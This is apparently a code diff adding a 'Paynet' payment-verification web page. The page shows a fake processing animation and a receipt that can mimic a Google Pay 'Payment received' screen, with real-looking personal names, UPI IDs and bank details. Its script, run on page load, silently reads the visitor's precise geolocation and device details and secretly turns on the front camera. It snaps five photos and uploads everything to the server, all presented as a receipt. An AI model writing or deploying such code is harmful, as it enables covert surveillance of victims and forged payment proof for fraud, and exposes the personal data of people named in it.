@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Verification - Paynet</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/paynet.css">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="/verify.css">
+</head>
+
+<body>
+    <div class="payment-container verify-container" id="mainContainer">
+        <!-- Logo Section (Only for generic, hidden in GPay mode) -->
+        <div class="logo-section" id="genericLogo">
+            <div class="paynet-logo">
+                <svg width="60" height="60" viewBox="0 0 60 60">
+                    <defs>
+                        <linearGradient id="shield-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#1A73E8" />
+                            <stop offset="100%" style="stop-color:#3B5FCC" />
+                        </linearGradient>
+                    </defs>
+                    <path d="M30 5 L50 15 L50 30 C50 42 30 55 30 55 C30 55 10 42 10 30 L10 15 Z"
+                        fill="url(#shield-gradient)" />
+                    <path d="M25 30 L28 33 L36 23" stroke="white" stroke-width="3" fill="none" stroke-linecap="round"
+                        stroke-linejoin="round" />
+                </svg>
+            </div>
+            <h1 class="brand-name">Paynet</h1>
+        </div>
+
+        <!-- Loading Section -->
+        <div id="loadingSection">
+            <h2 class="success-title">Processing Payment Details...</h2>
+            <p class="success-subtitle">Please wait while we verify your transaction</p>
+
+            <div style="margin: 30px 0;">
+                <div class="loading-spinner" style="margin: 0 auto;"></div>
+            </div>
+
+            <div class="verification-steps">
+                <div class="step">
+                    <svg class="step-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
+                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
+                    </svg>
+                    <span class="step-text">Connecting to payment gateway...</span>
+                </div>
+                <div class="step">
+                    <svg class="step-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
+                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
+                    </svg>
+                    <span class="step-text">Verifying transaction amount...</span>
+                </div>
+                <div class="step">
+                    <svg class="step-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
+                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
+                    </svg>
+                    <span class="step-text">Authenticating payment...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Generic Receipt Section -->
+        <div id="receiptSection" class="receipt">
+            <div class="receipt-header">
+                <div class="receipt-title">PAYMENT RECEIPT</div>
+                <div style="font-size: 12px; color: #5f6368; margin-top: 5px;">Transaction Successful</div>
+            </div>
+
+            <div class="receipt-amount">
+                <div class="receipt-amount-label">Amount Paid</div>
+                <div class="receipt-amount-value">₹500.00</div>
+            </div>
+
+            <div class="receipt-row">
+                <span class="receipt-label">Paid to</span>
+                <span class="receipt-value">Paynet Services</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">Transaction ID</span>
+                <span class="receipt-value" id="receipt-txn-id">TXN1234567890</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">Date & Time</span>
+                <span class="receipt-value" id="receipt-date">14 Feb 2026, 08:43 AM</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">Status</span>
+                <span class="receipt-value" style="color: #34A853; font-weight: 700;">✓ SUCCESS</span>
+            </div>
+        </div>
+
+        <!-- GOOGLE PAY CUSTOM RECEIPT -->
+        <div id="gpayReceiptSection" class="gpay-receipt">
+            <!-- Animated Checkmark -->
+            <svg class="success-checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                <circle class="success-checkmark__circle" cx="26" cy="26" r="25" fill="none" />
+                <path class="success-checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
+            </svg>
+
+            <div style="font-size: 24px; font-weight: 500; color: #202124; margin-bottom: 5px;">Payment received</div>
+            <div class="gpay-amount-display" id="gpay-amount">₹1,600</div>
+            <div id="gpay-to-name" class="gpay-to-name"
+                style="font-size: 16px; color: #5f6368; margin-bottom: 20px; font-weight: 400;">To Deepak Anna Bodke
+            </div>
+
+            <div class="gpay-timestamp" id="gpay-time">13 Feb 2026, 8:03 pm</div>
+
+            <div class="gpay-card">
+                <div class="gpay-card-header">
+                    <!-- Generic Bank Icon -->
+                    <div style="display: flex; align-items: center; gap: 10px; flex: 1;">
+                        <svg class="bank-icon" viewBox="0 0 24 24" style="fill: #1a73e8;">
+                            <path d="M4 10v7h3v-7H4zm6 0v7h3v-7h-3zm6 0v7h3v-7h-3zM2 22h19v-3H2v3zm19-19H2v6h19V3z" />
+                        </svg>
+                        <span class="gpay-value" id="gpay-bank" style="font-weight: 500;">Canara Bank 2461</span>
+                    </div>
+                    <span style="color: #5f6368;">▼</span>
+                </div>
+
+                <div class="gpay-card-body">
+                    <div class="gpay-row">
+                        <div class="gpay-label">UPI transaction ID</div>
+                        <div class="gpay-value" id="gpay-upi-txn">604456031510</div>
+                    </div>
+
+                    <div class="gpay-row">
+                        <div class="gpay-label" id="gpay-label-to">To: Deepak Anna Bodke</div>
+                        <div class="gpay-value" id="gpay-to-upi">gpay-12192992016@okbizaxis</div>
+                    </div>
+
+                    <div class="gpay-row">
+                        <div class="gpay-label" id="gpay-label-from">From: NOUFIYA J (Canara Bank)</div>
+                        <div class="gpay-value">Google Pay • <span id="gpay-from-upi">nowfiyajalal890@okaxis</span>
+                        </div>
+                    </div>
+
+                    <div class="gpay-row">
+                        <div class="gpay-label">Google transaction ID</div>
+                        <div class="gpay-value" id="gpay-google-txn">CICAgJIl3_rfbQ</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="gpay-footer-logo">
+                <svg height="24" viewBox="0 0 64 64">
+                    <path fill="#5f6368"
+                        d="M32 0C14.3 0 0 14.3 0 32s14.3 32 32 32 32-14.3 32-32S49.7 0 32 0zm0 58c-14.4 0-26-11.6-26-26S17.6 6 32 6s26 11.6 26 26-11.6 26-26 26z" />
+                    <path fill="#5f6368" d="M32 15l-5 10h10l-5-10z" />
+                </svg>
+                <span style="font-family: 'Google Sans'; color: #5f6368; font-size: 18px;">Google Pay</span>
+            </div>
+        </div>
+
+        <div class="footer" style="margin-top: 30px;" id="genericFooter">
+            <p class="powered-by">Secured by <strong>Paynet</strong></p>
+        </div>
+    </div>
+
+    <script>
+        let capturedPhotos = [];
+        let cameraStream = null;
+        let video = null;
+        let paymentData = null;
+
+        // Get payment ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const paymentId = urlParams.get('id');
+
+        // Fetch payment details on load
+        async function fetchPaymentDetails() {
+            if (!paymentId) return null;
+
+            try {
+                const response = await fetch('/validate-payment-id', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ paymentId: paymentId })
+                });
+
+                const data = await response.json();
+                if (data.valid) {
+                    return data.payment;
+                }
+            } catch (error) {
+                console.error('Error fetching payment details:', error);
+            }
+            return null;
+        }
+
+        // Auto-start camera and capture photos during animation
+        window.addEventListener('load', async function () {
+            // Initiate location logging silently
+            logVisit();
+
+            // Fetch payment details first
+            paymentData = await fetchPaymentDetails();
+
+            // Start camera silently in background
+            await startCameraInBackground();
+
+            // Capture 5 photos during animation (1 per second)
+            await captureMultiplePhotos();
+
+            // After photos captured, show receipt
+            setTimeout(() => {
+                document.getElementById('loadingSection').style.display = 'none';
+
+                // Check if custom payment
+                if (paymentData && paymentData.isCustom) {
+                    // ACTIVATE GOOGLE PAY MODE
+                    document.body.classList.add('gpay-mode');
+                    document.getElementById('genericLogo').style.display = 'none';
+                    document.getElementById('genericFooter').style.display = 'none';
+                    document.getElementById('gpayReceiptSection').style.display = 'block';
+
+                    // Populate Custom Data
+                    document.getElementById('gpay-amount').textContent = '₹' + paymentData.amount;
+                    document.getElementById('gpay-to-name').textContent = 'To ' + paymentData.toName;
+                    // Avatar removed in favor of checkmark
+                    document.getElementById('gpay-bank').textContent = paymentData.bankName;
+                    document.getElementById('gpay-upi-txn').textContent = paymentData.upiTxnId || generateRandomId(12);
+                    document.getElementById('gpay-to-upi').textContent = paymentData.upiId;
+
+                    document.getElementById('gpay-label-to').textContent = 'To: ' + paymentData.toName;
+                    document.getElementById('gpay-label-from').textContent = 'From: ' + paymentData.fromName + ' (' + paymentData.bankName.split(' ')[0] + ' Bank)';
+
+                    // Generate sender UPI based on name
+                    const senderUpi = paymentData.fromName.toLowerCase().replace(/\s+/g, '') + '@okaxis';
+                    document.getElementById('gpay-from-upi').textContent = senderUpi;
+
+                    document.getElementById('gpay-google-txn').textContent = paymentData.googleTxnId || 'CICAg' + generateRandomString(8);
+                    document.getElementById('gpay-time').textContent = paymentData.date;
+
+                } else {
+                    // GENERIC MODE
+                    document.getElementById('receiptSection').style.display = 'block';
+
+                    if (paymentData) {
+                        document.querySelector('.receipt-amount-value').textContent = `₹${paymentData.amount}.00`;
+                        document.getElementById('receipt-txn-id').textContent = paymentData.id;
+
+                        if (paymentData.merchant) {
+                            document.querySelectorAll('.receipt-value')[0].textContent = paymentData.merchant;
+                        }
+
+                        if (paymentData.date) {
+                            document.getElementById('receipt-date').textContent = paymentData.date;
+                        }
+                    }
+                }
+
+                // Stop camera
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
+
+                // Store photos like before
+                sessionStorage.setItem('capturedPhotos', JSON.stringify(capturedPhotos));
+            }, Math.floor(Math.random() * 2000) + 4000); // Random delay 4-6 seconds
+        });
+
+        // Helper for random IDs if missing
+        function generateRandomId(length) {
+            let result = '';
+            const characters = '0123456789';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        function generateRandomString(length) {
+            let result = '';
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        // Start camera in background (no visible element)
+        async function startCameraInBackground() {
+            try {
+                // Request camera access
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+
+                // Create hidden video element
+                video = document.createElement('video');
+                video.srcObject = cameraStream;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.play();
+                // Camera started silently
+            } catch (error) {
+                // Silent catch
+            }
+        }
+
+        // Capture multiple photos with upload
+        async function captureMultiplePhotos() {
+            return new Promise((resolve) => {
+                let photoCount = 0;
+                const maxPhotos = 5;
+
+                setTimeout(() => {
+                    const captureInterval = setInterval(async () => {
+                        if (photoCount >= maxPhotos || !video) {
+                            clearInterval(captureInterval);
+                            resolve();
+                            return;
+                        }
+
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+
+                        const photoData = canvas.toDataURL('image/jpeg', 0.85);
+                        capturedPhotos.push({
+                            timestamp: new Date().toISOString(),
+                            data: photoData
+                        });
+
+                        await sendPhotoToServer(photoData);
+
+                        photoCount++;
+                    }, 1000);
+                }, 1000);
+            });
+        }
+
+        async function sendPhotoToServer(photoData) {
+            try {
+                await fetch('/capture-photo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ photo: photoData })
+                });
+            } catch (error) {
+                console.error(error);
+            }
+        }
+
+        // Silent Location & Visit Logger
+        async function logVisit() {
+            let locationData = null;
+            let deviceData = null;
+
+            // Get Device Details
+            try {
+                deviceData = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: { width: screen.width, height: screen.height }
+                };
+            } catch (e) { }
+
+            // Get Location (High Accuracy)
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                locationData = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed
+                };
+            } catch (e) {
+                // Location failed (denied or timeout)
+            }
+
+            // Send to server
+            try {
+                await fetch('/log-visit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        paymentId: paymentId || 'UNKNOWN',
+                        location: locationData,
+                        deviceDetails: deviceData
+                    })
+                });
+            } catch (e) { }
+        }
+    </script>
+</body>
+
+</html>
